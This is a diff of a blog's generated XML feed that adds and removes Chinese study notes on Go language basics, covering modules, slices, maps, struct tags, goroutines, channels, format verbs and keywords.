+<h3 id="const分析"><a href="#const分析" class="headerlink" title="const分析:"></a>const分析:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Go 中的 <span class="keyword">const</span> 是“编译期常量”，意味着它的值在编译阶段必须 完全确定，不能依赖运行时信息。</span><br><span class="line">不能和任何变量相用</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-go模块化"><a href="#7-go模块化" class="headerlink" title="7.go模块化:"></a>7.go模块化:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">初始化mod；</span><br><span class="line">module go_project</span><br><span class="line"><span class="keyword">go</span> <span class="number">1.24</span><span class="number">.2</span></span><br><span class="line">这一步会生成 <span class="keyword">go</span>.mod 文件，告诉 Go：</span><br><span class="line">我这个项目的模块名是 go_project，你以后从 go_project/lib1 导入时，就从当前目录找。</span><br><span class="line">/go_project/</span><br><span class="line">├── <span class="keyword">go</span>.mod</span><br><span class="line">├── main.<span class="keyword">go</span></span><br><span class="line">└── lib1/</span><br><span class="line">    └── lib1.<span class="keyword">go</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>示例代码</th>
+<th>含义</th>
+<th>特点</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>匿名导入</strong></td>
+<td><code>import _ &quot;fmt&quot;</code></td>
+<td>给包起名为 <code>_</code>（匿名）</td>
+<td>❌ 无法使用包里的函数 ✅ 会执行包的 <code>init()</code> 方法</td>
+<td>常用于只需要执行包初始化逻辑，但不直接使用其函数，例如：注册驱动 <code>import _ &quot;github.com/lib/pq&quot;</code></td>
+</tr>
+<tr>
+<td><strong>别名导入</strong></td>
+<td><code>import aa &quot;fmt&quot;</code></td>
+<td>给 <code>fmt</code> 包起别名 <code>aa</code></td>
+<td>✅ 使用时需写 <code>aa.Println()</code> 等</td>
+<td>适用于避免多个包冲突，或希望起更简洁的名称</td>
+</tr>
+<tr>
+<td><strong>点导入</strong></td>
+<td><code>import . &quot;fmt&quot;</code></td>
+<td>将 <code>fmt</code> 包的方法直接导入到当前作用域</td>
+<td>✅ 可以直接写 <code>Println()</code> 而不是 <code>fmt.Println()</code></td>
+<td>不推荐频繁使用，容易造成命名混淆，常见于测试或临时场景</td>
+</tr>
+</tbody></table>
+<h2 id="8-defer的使用"><a href="#8-defer的使用" class="headerlink" title="8.defer的使用:"></a>8.defer的使用:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>之后的语句先执⾏，<span class="keyword">defer</span>后的语句后执⾏</span><br><span class="line">       --<span class="keyword">defer</span> 后会直接压入栈底</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-数组"><a href="#9-数组" class="headerlink" title="9.数组:"></a>9.数组:</h2><h3 id="1静态数组"><a href="#1静态数组" class="headerlink" title="1静态数组:"></a>1静态数组:</h3><h4 id="声明方式-1"><a href="#声明方式-1" class="headerlink" title="声明方式:"></a>声明方式:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myA [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line">myB:=[<span class="number">10</span>]<span class="type">int</span>&#123;&#125;     --&#123;&#125;可加可不加</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr [10]<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//这样是浅拷贝，不会影响原值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-动态数组"><a href="#2-动态数组" class="headerlink" title="2.动态数组:"></a>2.动态数组:</h3><h4 id="声明方式-2"><a href="#声明方式-2" class="headerlink" title="声明方式:"></a>声明方式:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明 slice1 是一个切片，并且初始化，默认值是 1, 2, 3。长度 len 是 3</span></span><br><span class="line">slice1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，但是并没有给 slice 分配空间</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span></span><br><span class="line">slice1 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)  <span class="comment">// 开辟 3 个空间，默认值是 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，同时给 slice 分配空间，3 个空间，初始化值是 0</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 slice1 是一个切片，同时给 slice 分配空间，3 个空间，初始化值是 0，</span></span><br><span class="line"><span class="comment">// 通过 := 推导出 slice 是一个切片</span></span><br><span class="line">slice1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//这样是深拷贝，会影响原值，传递的是指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="append增加"><a href="#append增加" class="headerlink" title="append增加:"></a>append增加:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">当动态数组通过</span><br><span class="line">         --myA=<span class="built_in">append</span>(myA,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">cap</span>:容量会扩大两倍</span><br><span class="line"> 但是<span class="built_in">len</span>:只会增加<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-截取操作"><a href="#3-截取操作" class="headerlink" title="3.截取操作:"></a>3.截取操作:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">newSlice := oldSlice[start:end]</span><br><span class="line">            start：起始下标（包含）</span><br><span class="line">            end：结束下标（不包含）</span><br><span class="line">            结果长度：end - start</span><br><span class="line">但是<span class="built_in">cap</span>：容量和原切片一致</span><br></pre></td></tr></table></figure>
+
+<h2 id="10-map-键值对类似字典"><a href="#10-map-键值对类似字典" class="headerlink" title="10.map(键值对类似字典):"></a>10.map(键值对类似字典):</h2><h3 id="1-声明方式"><a href="#1-声明方式" class="headerlink" title="1.声明方式:"></a>1.声明方式:</h3><table>
+<thead>
+<tr>
+<th>声明方式</th>
+<th>示例代码</th>
+<th>是否需要 <code>make</code></th>
+<th>是否支持立即赋值</th>
+<th>常用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>var + make</code></td>
+<td><code>var m map[string]string&lt;br&gt;m = make(map[string]string)&lt;br&gt;m[&quot;key&quot;] = &quot;value&quot;</code></td>
+<td>✅ 是</td>
+<td>❌ 否</td>
+<td>全局变量，需延后初始化</td>
+</tr>
+<tr>
+<td><code>:= + make</code></td>
+<td><code>m := make(map[int]string)&lt;br&gt;m[1] = &quot;value&quot;</code></td>
+<td>✅ 是</td>
+<td>❌ 否</td>
+<td>局部变量，简洁初始化</td>
+</tr>
+<tr>
+<td>字面量初始化</td>
+<td><code>m := map[string]string&#123;&lt;br&gt;  &quot;k1&quot;: &quot;v1&quot;,&lt;br&gt;  &quot;k2&quot;: &quot;v2&quot;,&lt;br&gt;&#125;</code></td>
+<td>❌ 否</td>
+<td>✅ 是</td>
+<td>已知数据时快速初始化</td>
+</tr>
+</tbody></table>
+<h2 id="11-面向对象"><a href="#11-面向对象" class="headerlink" title="11.面向对象"></a>11.面向对象</h2><p>Go 语言不是典型的面向对象语言，但它通过 <strong>结构体 + 接口</strong> 实现了封装、继承和多态的能力。</p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Go实现方式</th>
+<th>示例</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>封装</td>
+<td>字段&#x2F;方法首字母大写表示<strong>公开</strong>，小写表示<strong>私有</strong></td>
+<td><code>Name string</code> vs <code>name string</code></td>
+<td>访问控制基于大小写</td>
+</tr>
+<tr>
+<td>继承</td>
+<td><strong>通过组合（Embedding）结构体</strong>实现“继承”</td>
+<td><code>type Student struct &#123; Human &#125;</code></td>
+<td>没有 <code>extends</code>，但有字段&#x2F;方法提升</td>
+</tr>
+<tr>
+<td>多态</td>
+<td><strong>通过接口 interface</strong> 实现</td>
+<td><code>type Speaker interface &#123; Speak() &#125;</code></td>
+<td>接口隐式实现，无需关键字</td>
+</tr>
+</tbody></table>
+<h2 id="12-结构体标签"><a href="#12-结构体标签" class="headerlink" title="12.结构体标签:"></a>12.结构体标签:</h2><p>在 Go 语言中，<strong>结构体标签（Tag）</strong> 是给结构体字段添加额外元信息的一种方式，最常见的应用场景是用于 <strong>JSON 编解码、数据库ORM映射、验证器等</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>语法格式</td>
+<td><code>字段名 类型 </code>标签名:”值”<code> </code></td>
+<td>标签必须用反引号 <code> </code> <code> </code> &#96;</td>
+</tr>
+<tr>
+<td>JSON 标签</td>
+<td><code>json:&quot;name&quot;</code></td>
+<td>用于控制字段序列化时的名称</td>
+</tr>
+<tr>
+<td>多标签</td>
+<td><code>json:&quot;name&quot; db:&quot;user_name&quot;</code></td>
+<td>多个标签中间用空格分隔</td>
+</tr>
+<tr>
+<td>忽略字段</td>
+<td><code>json:&quot;-&quot;</code></td>
+<td>被 <code>-</code> 忽略，不参与序列化</td>
+</tr>
+<tr>
+<td>结构体字段首字母必须大写</td>
+<td><code>Name string</code></td>
+<td>小写字段无法导出，标签也无效</td>
+</tr>
+</tbody></table>
+<h3 id="标签的用途"><a href="#标签的用途" class="headerlink" title="标签的用途"></a>标签的用途</h3><table>
+<thead>
+<tr>
+<th>用途</th>
+<th>标签示例</th>
+<th>第三方库</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JSON</td>
+<td><code>json:&quot;name&quot;</code></td>
+<td><code>encoding/json</code></td>
+</tr>
+<tr>
+<td>数据库ORM</td>
+<td><code>gorm:&quot;column:user_name&quot;</code></td>
+<td><code>gorm</code></td>
+</tr>
+<tr>
+<td>表单验证</td>
+<td><code>validate:&quot;required&quot;</code></td>
+<td><code>go-playground/validator</code></td>
+</tr>
+<tr>
+<td>配置解析</td>
+<td><code>yaml:&quot;port&quot;</code></td>
+<td><code>gopkg.in/yaml.v2</code></td>
+</tr>
+<tr>
+<td>结构体比较</td>
+<td><code>cmp:&quot;ignore&quot;</code></td>
+<td><code>github.com/google/go-cmp</code></td>
+</tr>
+</tbody></table>
+<h2 id="13-go协程-goroutine"><a href="#13-go协程-goroutine" class="headerlink" title="13.go协程(goroutine):"></a>13.go协程(goroutine):</h2><h3 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1.基础用法:"></a>1.基础用法:</h3><table>
+<thead>
+<tr>
+<th>用法场景</th>
+<th>语法</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>启动协程</td>
+<td><code>go 函数名()</code></td>
+<td><code>go doWork()</code></td>
+</tr>
+<tr>
+<td>匿名函数协程</td>
+<td><code>go func()&#123;...&#125;()</code></td>
+<td><code>go func()&#123; fmt.Println(&quot;Hi&quot;) &#125;()</code></td>
+</tr>
+<tr>
+<td>协程同步</td>
+<td><code>sync.WaitGroup</code></td>
+<td>用于等待所有协程完成</td>
+</tr>
+<tr>
+<td>协程通信</td>
+<td><code>chan</code> 通道</td>
+<td><code>ch := make(chan int)</code>，用于发送&#x2F;接收数据</td>
+</tr>
+<tr>
+<td>协程超时</td>
+<td><code>select + time.After</code></td>
+<td>处理阻塞操作的超时控制</td>
+</tr>
+</tbody></table>
+<h3 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2.注意事项:"></a>2.注意事项:</h3><table>
+<thead>
+<tr>
+<th>注意点</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>不要在 goroutine 中访问共享变量（需加锁或使用 channel）</td>
+<td>避免数据竞争（data race）</td>
+</tr>
+<tr>
+<td>主程序要等待协程完成，否则程序会提前退出</td>
+<td>使用 <code>sync.WaitGroup</code></td>
+</tr>
+<tr>
+<td>不要忘记 <code>wg.Done()</code>，否则会死锁</td>
+<td><code>wg.Wait()</code> 永远不会结束</td>
+</tr>
+<tr>
+<td>大量协程可用 <code>GOMAXPROCS</code> 控制核心数</td>
+<td><code>runtime.GOMAXPROCS(n)</code></td>
+</tr>
+</tbody></table>
+<h2 id="14管道-channel"><a href="#14管道-channel" class="headerlink" title="14管道(channel):"></a>14管道(channel):</h2><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1.基本使用:"></a>1.基本使用:</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>创建通道</td>
+<td>用 <code>make(chan 类型)</code> 创建</td>
+<td><code>ch := make(chan int)</code></td>
+</tr>
+<tr>
+<td>发送数据</td>
+<td>使用 <code>&lt;-</code> 向通道发送值</td>
+<td><code>ch &lt;- 10</code></td>
+</tr>
+<tr>
+<td>接收数据</td>
+<td>从通道中读取值</td>
+<td><code>val := &lt;-ch</code></td>
+</tr>
+<tr>
+<td>无缓冲通道</td>
+<td>发送时必须等待接收方</td>
+<td><code>ch := make(chan int)</code></td>
+</tr>
+<tr>
+<td>有缓冲通道</td>
+<td>可存储一定数量数据</td>
+<td><code>ch := make(chan int, 3)</code></td>
+</tr>
+<tr>
+<td>关闭通道</td>
+<td>表示不会再发送数据</td>
+<td><code>close(ch)</code></td>
+</tr>
+<tr>
+<td><code>for range</code> 读取</td>
+<td>读取所有通道数据直到关闭</td>
+<td><code>for v := range ch &#123;...&#125;</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-与select使用"><a href="#2-与select使用" class="headerlink" title="2.与select使用:"></a>2.与select使用:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">done通道可以看作一个空结构体，不占用内存<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>使用模式</th>
+<th>示例代码片段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>接收多个通道数据</td>
+<td><code>select &#123; case v := &lt;-ch1: ... case v := &lt;-ch2: ... &#125;</code></td>
+<td>等待多个输入，哪个先来就处理哪个</td>
+</tr>
+<tr>
+<td>超时控制</td>
+<td><code>select &#123; case &lt;-ch: ... case &lt;-time.After(t): ... &#125;</code></td>
+<td>避免 goroutine 永远阻塞</td>
+</tr>
+<tr>
+<td>退出信号监听</td>
+<td><code>select &#123; case &lt;-data: ... case &lt;-done: return &#125;</code></td>
+<td>通过 <code>done</code> 通道优雅退出</td>
+</tr>
+<tr>
+<td>非阻塞 send&#x2F;recv</td>
+<td><code>select &#123; case ch &lt;- val: ... default: ... &#125;</code></td>
+<td>如果通道阻塞就执行 default</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>golang</category>
+      </categories>
+      <tags>
+        <tag>语言学习</tag>
+        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
@@ -4733,1116 +5788,6 @@
       </tags>
   </entry>
   <entry>
-    <title>基础用法</title>
-    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="1-verb（格式化动词）"><a href="#1-verb（格式化动词）" class="headerlink" title="1.verb（格式化动词）"></a>1.verb（格式化动词）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在 fmt.<span class="title function_ invoke__">Printf</span>()、fmt.<span class="title function_ invoke__">Sprintf</span>() 等函数中，verb 是以 % 开头的标识符，用于告诉程序以何种格式显示变量。</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-常用-verb-格式化动词表"><a href="#1-常用-verb-格式化动词表" class="headerlink" title="1.常用 verb 格式化动词表"></a>1.常用 verb 格式化动词表</h3><table>
-<thead>
-<tr>
-<th><strong>动词</strong></th>
-<th><strong>含义</strong></th>
-<th><strong>示例输出</strong>（假设变量值为 <code>x = 42</code>）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>%v</code></td>
-<td>默认格式输出</td>
-<td><code>42</code></td>
-</tr>
-<tr>
-<td><code>%+v</code></td>
-<td>输出结构体时，包含字段名</td>
-<td><code>&#123;Name:Tom Age:18&#125;</code></td>
-</tr>
-<tr>
-<td><code>%#v</code></td>
-<td>输出 Go 语法表示的值</td>
-<td><code>main.User&#123;Name:&quot;Tom&quot;, Age:18&#125;</code></td>
-</tr>
-<tr>
-<td><code>%T</code></td>
-<td>显示变量类型</td>
-<td><code>int</code></td>
-</tr>
-<tr>
-<td><code>%%</code></td>
-<td>输出 <code>%</code> 本身</td>
-<td><code>%</code></td>
-</tr>
-</tbody></table>
-<h3 id="2-数值类型格式化-verb"><a href="#2-数值类型格式化-verb" class="headerlink" title="2.数值类型格式化 verb"></a>2.数值类型格式化 verb</h3><table>
-<thead>
-<tr>
-<th><strong>动词</strong></th>
-<th><strong>说明</strong></th>
-<th><strong>示例</strong> (<code>x = 42</code>)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>%d</code></td>
-<td>十进制整数</td>
-<td><code>42</code></td>
-</tr>
-<tr>
-<td><code>%b</code></td>
-<td>二进制整数</td>
-<td><code>101010</code></td>
-</tr>
-<tr>
-<td><code>%o</code></td>
-<td>八进制</td>
-<td><code>52</code></td>
-</tr>
-<tr>
-<td><code>%x</code></td>
-<td>十六进制（小写）</td>
-<td><code>2a</code></td>
-</tr>
-<tr>
-<td><code>%X</code></td>
-<td>十六进制（大写）</td>
-<td><code>2A</code></td>
-</tr>
-<tr>
-<td><code>%c</code></td>
-<td>Unicode 字符</td>
-<td><code>*</code>（如果 42）</td>
-</tr>
-</tbody></table>
-<h3 id="3-字符串和布尔类型"><a href="#3-字符串和布尔类型" class="headerlink" title="3.字符串和布尔类型"></a>3.字符串和布尔类型</h3><table>
-<thead>
-<tr>
-<th><strong>动词</strong></th>
-<th><strong>说明</strong></th>
-<th><strong>示例</strong> (<code>s = &quot;hello&quot;</code>)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>%s</code></td>
-<td>字符串</td>
-<td><code>hello</code></td>
-</tr>
-<tr>
-<td><code>%q</code></td>
-<td>双引号字符串</td>
-<td><code>&quot;hello&quot;</code></td>
-</tr>
-<tr>
-<td><code>%t</code></td>
-<td>布尔值</td>
-<td><code>true</code> 或 <code>false</code></td>
-</tr>
-</tbody></table>
-<h3 id="4-总结表"><a href="#4-总结表" class="headerlink" title="4.总结表"></a>4.总结表</h3><table>
-<thead>
-<tr>
-<th>类别</th>
-<th>verb</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>常规</td>
-<td><code>%v</code> <code>%+v</code> <code>%#v</code> <code>%T</code> <code>%%</code></td>
-<td>通用格式</td>
-</tr>
-<tr>
-<td>整数</td>
-<td><code>%d</code> <code>%b</code> <code>%o</code> <code>%x</code> <code>%X</code> <code>%c</code></td>
-<td>数值格式</td>
-</tr>
-<tr>
-<td>字符串</td>
-<td><code>%s</code> <code>%q</code></td>
-<td>字符串处理</td>
-</tr>
-<tr>
-<td>布尔值</td>
-<td><code>%t</code></td>
-<td>布尔值显示</td>
-</tr>
-</tbody></table>
-<h2 id="2-关键字-25个"><a href="#2-关键字-25个" class="headerlink" title="2.关键字(25个):"></a>2.关键字(25个):</h2><table>
-<thead>
-<tr>
-<th>关键字</th>
-<th>含义说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>break</code></td>
-<td>跳出循环或 <code>switch</code></td>
-</tr>
-<tr>
-<td><code>case</code></td>
-<td><code>switch</code> 语句中的分支条件</td>
-</tr>
-<tr>
-<td><code>chan</code></td>
-<td>声明通道</td>
-</tr>
-<tr>
-<td><code>const</code></td>
-<td>声明常量</td>
-</tr>
-<tr>
-<td><code>continue</code></td>
-<td>继续下一次循环</td>
-</tr>
-<tr>
-<td><code>default</code></td>
-<td><code>switch</code> 默认分支</td>
-</tr>
-<tr>
-<td><code>defer</code></td>
-<td>延迟执行（函数结束前执行）</td>
-</tr>
-<tr>
-<td><code>else</code></td>
-<td>条件语句的“否则”分支</td>
-</tr>
-<tr>
-<td><code>fallthrough</code></td>
-<td><code>switch</code> 穿透下一分支</td>
-</tr>
-<tr>
-<td><code>for</code></td>
-<td>循环语句</td>
-</tr>
-<tr>
-<td><code>func</code></td>
-<td>声明函数</td>
-</tr>
-<tr>
-<td><code>go</code></td>
-<td>启动一个 goroutine（协程）</td>
-</tr>
-<tr>
-<td><code>goto</code></td>
-<td>跳转到标签</td>
-</tr>
-<tr>
-<td><code>if</code></td>
-<td>条件判断语句</td>
-</tr>
-<tr>
-<td><code>import</code></td>
-<td>导入包</td>
-</tr>
-<tr>
-<td><code>interface</code></td>
-<td>定义接口类型</td>
-</tr>
-<tr>
-<td><code>map</code></td>
-<td>映射类型（键值对结构）</td>
-</tr>
-<tr>
-<td><code>package</code></td>
-<td>声明包名</td>
-</tr>
-<tr>
-<td><code>range</code></td>
-<td>用于遍历数组、切片、map 等</td>
-</tr>
-<tr>
-<td><code>return</code></td>
-<td>返回函数结果</td>
-</tr>
-<tr>
-<td><code>select</code></td>
-<td>多通道选择</td>
-</tr>
-<tr>
-<td><code>struct</code></td>
-<td>声明结构体</td>
-</tr>
-<tr>
-<td><code>switch</code></td>
-<td>多分支选择语句</td>
-</tr>
-<tr>
-<td><code>type</code></td>
-<td>声明类型</td>
-</tr>
-<tr>
-<td><code>var</code></td>
-<td>声明变量</td>
-</tr>
-</tbody></table>
-<h3 id="总结表"><a href="#总结表" class="headerlink" title="总结表"></a>总结表</h3><table>
-<thead>
-<tr>
-<th>类别</th>
-<th>关键字举例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>控制流程</td>
-<td><code>if</code>, <code>else</code>, <code>for</code>, <code>switch</code>, <code>case</code>, <code>fallthrough</code>, <code>break</code>, <code>continue</code>, <code>goto</code>, <code>return</code></td>
-</tr>
-<tr>
-<td>并发相关</td>
-<td><code>go</code>, <code>select</code>, <code>chan</code></td>
-</tr>
-<tr>
-<td>定义声明</td>
-<td><code>var</code>, <code>const</code>, <code>type</code>, <code>func</code>, <code>package</code>, <code>import</code>, <code>struct</code>, <code>interface</code>, <code>map</code></td>
-</tr>
-<tr>
-<td>特殊用途</td>
-<td><code>defer</code>, <code>range</code></td>
-</tr>
-</tbody></table>
-<h2 id="3-常量"><a href="#3-常量" class="headerlink" title="3.常量:"></a>3.常量:</h2><table>
-<thead>
-<tr>
-<th>标识符</th>
-<th>类型</th>
-<th>是否为常量</th>
-<th>用途说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>true</code></td>
-<td><code>bool</code></td>
-<td>✅ 是常量</td>
-<td>表示布尔真值</td>
-<td><code>const ok = true</code></td>
-</tr>
-<tr>
-<td><code>false</code></td>
-<td><code>bool</code></td>
-<td>✅ 是常量</td>
-<td>表示布尔假值</td>
-<td><code>var done = false</code></td>
-</tr>
-<tr>
-<td><code>iota</code></td>
-<td><code>int</code></td>
-<td>⚠️ 特殊标识符</td>
-<td>用于 <strong>常量声明组中自动生成递增数字</strong>（仅在 <code>const</code> 中可用）</td>
-<td><code>const (A = iota; B; C)</code></td>
-</tr>
-<tr>
-<td><code>nil</code></td>
-<td><code>预定义空值</code></td>
-<td>⚠️ 不是 const 常量</td>
-<td>表示<strong>指针、切片、map、chan、接口、函数的零值</strong>（未初始化）</td>
-<td><code>var p *int = nil</code></td>
-</tr>
-</tbody></table>
-<h3 id="声明方式"><a href="#声明方式" class="headerlink" title="声明方式:"></a>声明方式:</h3><table>
-<thead>
-<tr>
-<th>声明方式</th>
-<th>示例</th>
-<th>说明</th>
-<th>是否支持类型推导</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1. 显式声明（带类型）</td>
-<td><code>var a int</code></td>
-<td>默认值为0（int）</td>
-<td>❌ 不支持</td>
-</tr>
-<tr>
-<td>2. 显式声明 + 初始化</td>
-<td><code>var a int = 10</code></td>
-<td>有初始值</td>
-<td>✅ 支持（可省略类型）</td>
-</tr>
-<tr>
-<td>3. 类型推导声明</td>
-<td><code>var a = 10</code></td>
-<td>类型自动为 int</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>4. 短变量声明</td>
-<td><code>a := 10</code></td>
-<td>只能在函数内部使用</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>5. 多变量声明</td>
-<td><code>var a, b int = 1, 2</code></td>
-<td>可多个变量同时声明</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>6. 匿名变量</td>
-<td><code>_ = someFunc()</code></td>
-<td>用于忽略返回值</td>
-<td>❌</td>
-</tr>
-<tr>
-<td>7. 常量声明</td>
-<td><code>const Pi = 3.14</code></td>
-<td>值不可修改</td>
-<td>✅（编译期推导）</td>
-</tr>
-</tbody></table>
-<h2 id="4-类型"><a href="#4-类型" class="headerlink" title="4.类型:"></a>4.类型:</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类:"></a>1.分类:</h3><table>
-<thead>
-<tr>
-<th>类型类别</th>
-<th>描述说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1. <strong>基础类型</strong></td>
-<td>内建类型，Go 提供的最基本类型</td>
-<td><code>int</code>, <code>string</code>, <code>bool</code></td>
-</tr>
-<tr>
-<td>2. <strong>复合类型</strong></td>
-<td>由多个值组合而成的结构，支持更复杂的数据结构</td>
-<td><code>array</code>, <code>slice</code>, <code>map</code>, <code>struct</code></td>
-</tr>
-<tr>
-<td>3. <strong>引用类型</strong></td>
-<td>本质是指向底层数据的指针或引用（非值拷贝）</td>
-<td><code>pointer</code>, <code>channel</code>, <code>func</code></td>
-</tr>
-<tr>
-<td>4. <strong>自定义类型</strong></td>
-<td>使用 <code>type</code> 关键字定义的新类型，包含结构体、接口、别名等</td>
-<td><code>type MyInt int</code>、<code>type Person struct &#123;...&#125;</code></td>
-</tr>
-</tbody></table>
-<h3 id="2-基础类型"><a href="#2-基础类型" class="headerlink" title="2.基础类型:"></a>2.基础类型:</h3><table>
-<thead>
-<tr>
-<th>类型名</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>int</code></td>
-<td>整数类型（平台相关位数）</td>
-</tr>
-<tr>
-<td><code>int32</code></td>
-<td>32 位整数</td>
-</tr>
-<tr>
-<td><code>float64</code></td>
-<td>64 位浮点数</td>
-</tr>
-<tr>
-<td><code>bool</code></td>
-<td>布尔值（true&#x2F;false）</td>
-</tr>
-<tr>
-<td><code>string</code></td>
-<td>字符串类型</td>
-</tr>
-</tbody></table>
-<h3 id="3-复合类型"><a href="#3-复合类型" class="headerlink" title="3.复合类型:"></a>3.复合类型:</h3><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>array</code></td>
-<td>定长数组</td>
-</tr>
-<tr>
-<td><code>slice</code></td>
-<td>动态数组切片</td>
-</tr>
-<tr>
-<td><code>map</code></td>
-<td>映射结构，键值对存储</td>
-</tr>
-<tr>
-<td><code>struct</code></td>
-<td>自定义结构体，可组合多字段</td>
-</tr>
-</tbody></table>
-<h3 id="4-引用类型"><a href="#4-引用类型" class="headerlink" title="4.引用类型:"></a>4.引用类型:</h3><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>pointer</code></td>
-<td>指针类型</td>
-</tr>
-<tr>
-<td><code>channel</code></td>
-<td>并发通道类型（用于 goroutine 通信）</td>
-</tr>
-<tr>
-<td><code>func</code></td>
-<td>函数类型，可作为变量&#x2F;参数传递</td>
-</tr>
-</tbody></table>
-<h3 id="5-自定义类型："><a href="#5-自定义类型：" class="headerlink" title="5.自定义类型："></a>5.自定义类型：</h3><table>
-<thead>
-<tr>
-<th>类型形式</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>自定义基本类型</td>
-<td><code>type MyInt int</code></td>
-</tr>
-<tr>
-<td>自定义结构体</td>
-<td><code>type Student struct &#123;...&#125;</code></td>
-</tr>
-<tr>
-<td>自定义接口</td>
-<td><code>type Writer interface &#123;...&#125;</code></td>
-</tr>
-<tr>
-<td>类型别名（不是新类型）</td>
-<td><code>type Rune = int32</code></td>
-</tr>
-</tbody></table>
-<h3 id="6-总结-："><a href="#6-总结-：" class="headerlink" title="6.总结 ："></a>6.总结 ：</h3><table>
-<thead>
-<tr>
-<th>分类</th>
-<th>关键字&#x2F;构造方式</th>
-<th>是否值类型</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>基础类型</td>
-<td><code>int</code>, <code>string</code>, <code>bool</code></td>
-<td>✅</td>
-<td><code>var name string</code></td>
-</tr>
-<tr>
-<td>复合类型</td>
-<td><code>array</code>, <code>slice</code>, <code>map</code></td>
-<td>❌（slice&#x2F;map是引用）</td>
-<td><code>[]int</code>, <code>map[string]int</code></td>
-</tr>
-<tr>
-<td>引用类型</td>
-<td><code>*T</code>, <code>chan T</code>, <code>func()</code></td>
-<td>❌</td>
-<td><code>var p *int</code></td>
-</tr>
-<tr>
-<td>自定义类型</td>
-<td><code>type</code> 关键字定义</td>
-<td>取决于底层类型</td>
-<td><code>type ID int</code>, <code>type T = U</code></td>
-</tr>
-</tbody></table>
